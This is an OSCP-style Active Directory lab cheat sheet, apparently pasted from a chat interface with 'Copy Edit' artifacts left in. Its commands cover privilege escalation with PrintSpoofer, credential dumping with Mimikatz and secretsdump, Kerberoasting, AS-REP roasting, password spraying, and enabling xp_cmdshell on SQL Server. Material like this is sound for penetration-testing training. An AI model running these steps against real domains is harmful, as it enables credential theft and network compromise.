# 🛡️ OSCP Active Directory Lab Guide (Refined)

## 1. Escalate on MS01 (Always Dual-Homed)
- Confirm **SeImpersonatePrivilege** (e.g. `whoami /priv`)
- Use **PrintSpoofer** to escalate to Local Admin  
  ```bash
  PrintSpoofer.exe -i -c cmd
Dump credentials with Mimikatz

powershell
Copy
Edit
sekurlsa::logonpasswords
2. Enumerate the Domain (From MS01)
Use nxc to:

Enumerate domain users and build domain_users.txt

bash
Copy
Edit
nxc smb --users --host <DC>
Enumerate SMB shares

bash
Copy
Edit
nxc smb --shares --host <target>
Check for Kerberoasting:

bash
Copy
Edit
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request
Check for AS-REP Roasting:

bash
Copy
Edit
GetNPUsers.py <domain>/ -usersfile domain_users.txt -no-pass -dc-ip <DC_IP>
Password spray via:

bash
Copy
Edit
nxc smb --spray ...
nxc winrm --spray ...
nxc rdp --spray ...
3. Pivot to MS02
Use sprayed creds to access via WinRM or RDP:

bash
Copy
Edit
nxc winrm --auth <user>:<pass> --host <MS02>
or

bash
Copy
Edit
xfreerdp /u:<user> /p:<pass> /v:<MS02>
4. Enumerate MS02
Look for:

C:\windows.old folder (old user data, SAM, SYSTEM)

Custom binaries → strings to extract creds

PowerShell history:

powershell
Copy
Edit
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Dump SAM and SYSTEM files locally:

bash
Copy
Edit
secretsdump.py -sam SAM -system SYSTEM LOCAL
5. Domain Privilege Escalation
Crack Kerberoast/AS-REP hashes (e.g. with hashcat or john)

Use cracked SQL creds to connect with mssqlclient.py:

bash
Copy
Edit
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
Spray all discovered creds again to escalate further

Once Domain Admin, dump all relevant data and finalize report

Quick Visual Flow
csharp
Copy
Edit
[MS01: Low Priv User]
        ↓
[Privilege Escalation: SeImpersonate → LA]
        ↓
[Mimikatz → Dump Creds]
        ↓
[Domain Enum: nxc, GetNPUsers, GetUserSPNs]
        ↓
[Password Spray: SMB / WinRM / RDP]
        ↓
[Access MS02 (WinRM/RDP)]
        ↓
[Enum MS02: windows.old, PS history, strings]
        ↓
[Dump SAM+SYSTEM → secretsdump]
        ↓
[Crack / Reuse → Get DA]